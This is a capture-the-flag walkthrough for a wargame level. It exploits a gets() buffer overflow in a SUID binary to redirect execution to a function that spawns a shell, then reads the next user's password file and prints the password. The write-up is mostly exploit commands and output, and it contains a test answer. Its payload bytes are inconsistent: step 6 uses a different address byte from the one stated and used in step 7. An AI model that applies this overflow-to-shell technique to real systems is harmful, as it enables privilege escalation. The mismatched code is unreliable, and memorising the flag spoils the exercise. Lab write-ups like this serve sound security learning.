# Level 1 Walkthrough

1. **List the contents of the home directory**

	```bash
	ls -l
	```

	Output shows a SUID binary owned by `level2`:

	```
	-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
	```

2. **Test the binary**

	```bash
	./level1
	```

	It waits for the input.

3. **Transfer the binary locally**

	```bash
	scp -P 4242 level1@<vm-ip>:/home/user/level1/level1 .
	```

4. **Analyze with Ghidra**
	Main vulnerability:

	```c
	void run() {
		fwrite("Good... Wait what?\n", 1, 0x13, stdout);
		system("/bin/sh");
	}

	void main() {
		char buffer[76];
		gets(buffer);
	}
	```

	Vulnerability: `gets()` is unsafe and allows buffer overflow. Goal is to overwrite the return address to call `run()`.

5. **Find address of `run()` with GDB**

	```bash
	gdb level1
	(gdb) disas run
	```

	Example output:

	```
	0x08048444 <+0>: ...
	```

	Save this address (e.g., `0x08048444`).

6. **Build exploit payload**

	* Fill buffer with 76 bytes
	* Append the address of `run()` (in little-endian)

	```bash
	(head -c 76 < /dev/zero | tr '\0' 'A'; printf '\x4a\x84\x04\x08') | ./level1
	```

7. **If needed, save to a file**

	```bash
	(head -c 76 < /dev/zero | tr '\0' 'A' > /tmp/payload; printf '\x44\x84\x04\x08') >> /tmp/payload
	```

8. **Trigger the exploit**

	```bash
	(cat /tmp/payload; cat) | ./level1
	```

9. **Try typing**

	```bash
	whoami
	```

10. **Read the password**

	```bash
	cat /home/user/level2/.pass
	```

	Output:

	```
	53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
	```
